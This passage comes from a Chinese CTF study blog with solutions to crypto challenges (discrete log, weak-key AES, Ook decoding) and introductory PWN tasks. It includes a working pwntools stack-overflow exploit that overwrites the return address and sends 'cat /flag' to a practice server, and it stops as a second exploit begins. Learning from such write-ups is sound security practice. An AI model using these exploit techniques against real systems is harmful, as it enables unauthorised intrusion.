c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'m = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'c = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>

<span class="token comment"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span>
<span class="token comment"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>m是取的随机数，但是最后给出来了，那这个问题就落在了下面的这条语句上面了</p>
<pre class="line-numbers language-none"><code class="language-none">c &#x3D; pow(m, bytes_to_long(flag), n)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>既</p>
<script type="math/tex; mode=display">
c = m ^ {flag}\quad mod \quad{n} \\
也就是\\
m ^ {flag} = c\quad mod \quad{n}</script><p>此时欲求得flag，sympy是有专门的函数的，这个函数的用法是<code>flag = sympy.discrete_log(n, c, m)</code>，如此即可求得flag。</p>
<p>故写解题脚本如下所示</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sympy

n <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">512</span>
m <span class="token operator">=</span> <span class="token number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span>
c <span class="token operator">=</span> <span class="token number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span>

flag <span class="token operator">=</span> sympy<span class="token punctuation">.</span>discrete_log<span class="token punctuation">(</span>n<span class="token punctuation">,</span> c<span class="token punctuation">,</span> m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># b'flag&#123;5f95ca93-1594-762d-ed0b-a9139692cb4a&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h4 id="ACTF新生赛2020-crypto-aes"><a href="#ACTF新生赛2020-crypto-aes" class="headerlink" title="[ACTF新生赛2020]crypto-aes"></a>[ACTF新生赛2020]crypto-aes</h4><p>给出的脚本大概就像是这样的，</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">import</span> os
<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span>
    iv <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">^</span> bytes_to_long<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">)</span>
    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
    enc_flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span><span class="token string">b'FLAG'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>enc_flag<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里为什么随机的key和iv我们仍然是可以破解的呢？因为这个key是两个byte的重复，而且给出了key和iv的按位异或的值。并且这个异或是从右向左异或的，key的长度大于iv的长度，所以前面的很多位来说，异或后的值是等于key的，故此可得key、iv，亦可解密。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">import</span> os
<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>


key_iv <span class="token operator">=</span> <span class="token number">91144196586662942563895769614300232343026691029427747065707381728622849079757</span>
enc_flag <span class="token operator">=</span> <span class="token string">b'\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&amp;\xd6\x91\xfe\xf3\x14\x10|\xf8p'</span>

key <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>key_iv<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>
iv <span class="token operator">=</span> key_iv <span class="token operator">^</span> bytes_to_long<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
iv <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>iv<span class="token punctuation">)</span>
aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
flag <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>enc_flag<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># b'actf&#123;W0W_y0u_can_so1v3_AES_now!&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h3><h4 id="ctfshow、crypto6"><a href="#ctfshow、crypto6" class="headerlink" title="ctfshow、crypto6"></a>ctfshow、crypto6</h4><p>提示为：<code>密钥为**加密方式**名称，区分大小写</code></p>
<pre class="line-numbers language-none"><code class="language-none">密文：
U2FsdGVkX19mGsGlfI3nciNVpWZZRqZO2PYjJ1ZQuRqoiknyHSWeQv8ol0uRZP94
MqeD2xz+
密钥：
加密方式名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这种<code>U2Fsd</code>开头的一般就是那几种<code>对称加密</code>，这个对称加密有个专门的网站<a target="_blank" rel="noopener" href="https://www.sojson.com/encrypt_aes.html">https://www.sojson.com/encrypt_aes.html</a></p>
<p>然后从aes一个一个地试试就好了。</p>
<p><img src="/2021/05/28/CTF/image-20210720145845078.png" alt></p>
<h4 id="ctfshow、crypto7"><a href="#ctfshow、crypto7" class="headerlink" title="ctfshow、crypto7"></a>ctfshow、crypto7</h4><p><strong>TAG: Ook!</strong></p>
<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/brainfuck">Ook在线网站</a></p>
<pre class="line-numbers language-none"><code class="language-none">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!
Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook?
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?
Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook.
Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.
Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.
Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook. Ook.
Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.
Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!
Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.
Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!
Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!
Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook! Ook. Ook? Ook. 

flag&#123;b615c4b79a1aede83b9ae67104ff4eb5&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210720150259583.png" alt></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/129837931">kali配置安装pwn环境</a></p>
<h3 id="安装peda"><a href="#安装peda" class="headerlink" title="安装peda"></a>安装peda</h3><p>我先安装的是peda，直接就两个命令，下面的两个命令</p>
<pre class="line-numbers language-command" data-language="command"><code class="language-command">git clone https:&#x2F;&#x2F;github.com&#x2F;longld&#x2F;peda.git ~&#x2F;peda
echo &quot;source ~&#x2F;peda&#x2F;peda.py&quot; &gt;&gt; ~&#x2F;.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>直接gdb命令出现的就是peda的前缀了。</p>
<p><strong>对pwn的难度估计出现了重大失误，这个门槛还是很高的，等下学期学了病毒分析再入门吧。</strong></p>
<h2 id="一般pwn"><a href="#一般pwn" class="headerlink" title="一般pwn"></a>一般pwn</h2><h3 id="绝对签到题"><a href="#绝对签到题" class="headerlink" title="绝对签到题"></a>绝对签到题</h3><h4 id="buu、test-your-nc"><a href="#buu、test-your-nc" class="headerlink" title="buu、test_your_nc"></a>buu、test_your_nc</h4><p>直接nc就行了，这个主要是好像pwn里面经常是要使用nc工具的。</p>
<pre class="line-numbers language-none"><code class="language-none">nc node3.buuoj.cn 28024
cat &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210601121350820.png" alt="image-20210601121350820"></p>
<h2 id="普通溢出题目"><a href="#普通溢出题目" class="headerlink" title="普通溢出题目"></a>普通溢出题目</h2><h3 id="普通栈溢出"><a href="#普通栈溢出" class="headerlink" title="普通栈溢出"></a>普通栈溢出</h3><h4 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h4><p><img src="/2021/05/28/CTF/image-20210711195254351.png" alt></p>
<p>使用64位的ida解决。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// main函数的反汇编代码如下</span>
<span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+1h] [rbp-Fh] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ok,bye!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>据判断，gets函数具有栈溢出漏洞</p>
<p><img src="/2021/05/28/CTF/image-20210714201214783.png" alt></p>
<p>s的大小限制为15位(F - 0 = F[F为10进制的15])，只要传入超过15个byte就会导致溢出，然后转到system函数(程序中的fun函数里面有system方法)，然后就再看看ida里面他的函数的开始地址<strong>0x401186</strong></p>
<p><img src="/2021/05/28/CTF/image-20210714202217709.png" alt></p>
<p>然后就认为我们的payload可以为如下</p>
<pre class="line-numbers language-none"><code class="language-none">b&quot;a&quot; * 15 + p64(0x401186)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>p64</strong>代表的是这个地址是64位机的地址pack 64 bits number。</p>
<pre class="line-numbers language-none"><code class="language-none">p32&#x2F;p64: 打包一个整数，分别打包为32位或64位
u32&#x2F;u64: 解包一个字符串，得到整数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后写脚本如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27897</span><span class="token punctuation">)</span>

buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">15</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># flag&#123;42bfbcd2-053e-4a41-8581-3a8e676a4c9a&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h4><p><strong>TAG：gets栈溢出漏洞，后门函数</strong></p>
<p>听说大家ida打开之前都会使用checksec来检查一下应用程序是否是有保护的，这里的checksec是可以直接下的，但是好像某个工具里面自带的也是有的，这里为了方便，先直接<code>sudo apt install checksec</code>来下载一下这个工具。</p>
<p>然后就是直接看ida了，main函数的内容为</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-80h] BYREF</span>
  <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-40h] BYREF</span>

  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"-Warm Up-\n"</span><span class="token punctuation">,</span> <span class="token number">0xAuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"WOW:"</span><span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%p\n"</span><span class="token punctuation">,</span> sub_40060D<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>应该是最后的这个v5的大小限制导致栈溢出的，然后再去看v5的容量为</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">-0000000000000040 var_40          db 64 dup(?)
+0000000000000000  s              db 8 dup(?)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>是这个，<code>80-40=40(十六进制)</code>还要加上返回地址的8个字节，这里应该说的是return所造成的8个字节的返回地址。</p>
<p>估计就是64位的机器，然后一个字节等于8个位，所以64位=8×8位。就是8个字节。(猜想的，现在还不是很明白)</p>
<p><img src="/2021/05/28/CTF/image-20210717212917762.png" alt="后门函数所在地址为0x40060d"></p>
<p>然后就可以写出利用方式如下所示</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

